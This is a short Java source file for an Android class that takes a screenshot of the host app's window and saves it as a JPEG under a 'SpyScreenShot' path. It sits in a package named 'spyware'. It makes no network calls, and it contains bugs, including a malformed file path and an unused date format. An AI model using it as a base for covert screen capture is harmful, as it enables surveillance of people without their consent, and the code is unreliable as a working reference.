package com.example.cristianturetta.spyware;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;

public class ScreenShooter {

    private Context context;

    public ScreenShooter(Context context) {
        this.context = context;
    }

    // TODO error parsing context to activity
    private Activity getActivity(){
        Activity a;
        try {
            a = (Activity)context;
            return a;
        }catch (Exception e){
            Log.e("Error", "casting context to activity");
        }
        return null;
    }

    public void takeScreenShot(){
        Activity activity = getActivity();
        View view = activity.getWindow().getDecorView();
        view.setDrawingCacheEnabled(true);
        view.buildDrawingCache();

        Bitmap bitmap = view.getDrawingCache();
        Rect frame = new Rect();
        activity.getWindow().getDecorView().getWindowVisibleDisplayFrame(frame);
        int statusBarHeight = frame.top;

        // Find the screen dimensions to create bitmap in the same size.
        int width = activity.getWindowManager().getDefaultDisplay().getWidth();
        int height = activity.getWindowManager().getDefaultDisplay().getHeight();

        Bitmap screenDimensionBitmap = Bitmap.createBitmap(bitmap,0, statusBarHeight, width,height - statusBarHeight);
        view.destroyDrawingCache();

        // Save it on external storage
        Date date = new Date();
        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);

        try{
            String screenShotPath = Environment.getExternalStorageDirectory().toString() + "SpyScreenShot/" + date + ".jpg";
            File imageFile = new File(screenShotPath);
            FileOutputStream outputStream = new FileOutputStream(imageFile);
            screenDimensionBitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream);
            outputStream.flush();
            outputStream.close();
        }catch (FileNotFoundException fnfe){
            Log.e("Error", fnfe.getLocalizedMessage());
        } catch (IOException ioe) {
            Log.e("Error", ioe.getLocalizedMessage());
        }
    }
}
